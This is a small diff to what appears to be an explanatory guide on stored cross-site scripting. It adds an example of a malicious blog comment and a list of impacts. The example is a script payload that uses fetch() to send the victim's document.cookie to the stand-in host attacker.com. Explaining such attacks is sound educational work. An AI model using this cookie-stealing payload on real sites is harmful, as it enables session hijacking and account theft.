@@ -205,4 +205,12 @@ If `query` is displayed without sanitization, the script runs.
 - Server delivers the script to the victim’s browser.  
 - Script executes in their context.  
 
-###
+### **Example:**  
+```html
+<!-- Malicious comment in a blog -->
+<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
+```
+
+### **Impact:**  
+- Long-term compromise of user accounts/sessions.  
+- Mass infection (e.g., spreading malware via social media).
